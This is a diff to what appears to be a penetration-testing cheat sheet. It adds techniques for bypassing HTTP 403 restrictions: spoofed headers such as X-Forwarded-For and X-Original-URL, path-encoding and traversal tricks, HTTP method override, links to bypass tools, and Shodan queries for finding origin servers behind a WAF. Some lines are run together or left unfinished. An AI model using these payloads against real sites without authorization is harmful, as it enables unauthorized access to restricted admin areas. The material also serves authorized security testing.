@@ -192,3 +192,128 @@ IF(1=1, SLEEP(5), 0)
 Technique #10 : Second-Order Attacks
 - Store payloads in one location that gets executed in another (e.g., admin panel)
 - WAFs may miss these since the injection isn’t directly executed
+
+
+
+403 forbidden bypass :
+
+Technique #1: Header Manipulation
+
+```bash
+Referer: https://target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+X-Forwarded-For: 127.0.0.1
+X-Custom-IP-Authorization
+X-Forwarded-For
+X-Forward-For
+X-Remote-IP
+X-Originating-IP
+X-Remote-Addr
+X-Client-IP
+X-Real-IP
+
+
+curl -X GET https://target.com/ -H “X-Original-URL: /admin”
+curl -H "Host: alternative.example.com or google.com" http://example.com/secret/
+
+
+
+✔️ Modify headers like Referer, X-Original-URL, X-Rewrite-URL.
+
+```
+
+Technique #2: Directory Traversal Tricks
+```bash
+Adding a slash:
+https://target.com/admin/
+
+Appending null byte:
+https://target.com/admin%00
+
+URL encoding:
+https://target.com/%2e%2e/admin
+
+curl http://example.com/../secret/
+
+
+/admin/(admin slash), you could try /admin/’,/admin%2e/, or/admin/.htaccess`.
+http://example.com/secret/http://example.com/secret..;/http://example.com/secret.
+
+
+String terminators (%00, 0x00, //, ;, %, !, ?, [] etc.) — adding those to the end of the path and inside the path
+
+
+some bypass to try :
+site.com/secret –> HTTP 403 Forbidden
+site.com/SECRET –> HTTP 200 OK
+site.com/secret/ –> HTTP 200 OK
+site.com/secret/. –> HTTP 200 OK
+site.com//secret// –> HTTP 200 OK
+site.com/./secret/.. –> HTTP 200 OK
+site.com/;/secret –> HTTP 200 OK
+site.com/.;/secret –> HTTP 200 OK
+site.com//;//secret –> HTTP 200 OK
+site.com/secret.json –> HTTP 200 OK (ruby
+
+
+```
+
+Technique #3: Method swapping
+```bash
+✔️ Always test multiple HTTP methods (GET, POST, OPTIONS, TRACE, PUT, HEAD).
+
+curl -X TRACE https://target.com/ -H “User-Agent: Custom”
+curl -X POST https://target.com/ -H "X-HTTP-Method-Override: DELETE" (spoof header)
+
+```
+
+Technique #4 : Bypass with Case Manipulation
+```bash
+http://example.com/SeCrEt/
+```
+
+Technique #5 :  Leverage Proxy or IP Spoofing
+```bash
+proxychains curl http://example.com/secret/
+```
+
+Technique #6: Check for Backup Files or Alternate Endpoints
+```bash
+curl http://example.com/secret.bak # directory brute force . directly file brute force for bypass 403 
+```
+
+Technique #7: Switch Between HTTP and HTTPS
+```bash
+http://example.com/secret/https://example.com/secret/
+```
+
+
+✔️ Check for WAF/CDN filtering that may be bypassed.
+
+
+Automated tools :
+https://github.com/iamj0ker/bypass-403
+https://github.com/Dheerajmadhukar/4-ZERO-3
+https://github.com/byt3hx/403-bypass
+https://github.com/offsecdawn/403bypass?source=post_page-----50bc0663daa0---------------------------------------
+https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122
+
+
+
+Find real IP behind WAF :
+
+- search domain name in shodan or censys
+	- https://securitytrails.com/
+	- https://search.censys.io/
+	- https://github.com/m0rtem/CloudFail
+	- https://www.shodan.io/
+	- shodan search query : "ssl.cert.subject.CN=DomainName.com" or "http.title:’Welcome to NGINX’"
+
+
+
+
+
+
+Automated tools :
+https://github.com/Dheerajmadhukar/Lilly
+https://github.com/Dheerajmadhukar/4-ZERO-3
